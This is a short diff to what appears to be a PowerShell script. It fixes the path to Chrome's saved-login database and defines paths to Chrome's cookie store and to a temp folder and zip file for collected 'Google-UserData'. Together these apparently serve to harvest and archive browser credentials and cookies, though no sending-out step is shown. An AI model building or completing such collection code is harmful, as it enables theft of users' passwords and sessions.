@@ -9,7 +9,7 @@
 # Version: 1.0
 # 
 
-$GLoginPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data.json"
+$GLoginPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 $GcookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
 $GoogleFolderPath = "$env:tmp\Google-UserData\"
 $GfilePath = "$env:temp\Google-UserData.zip"
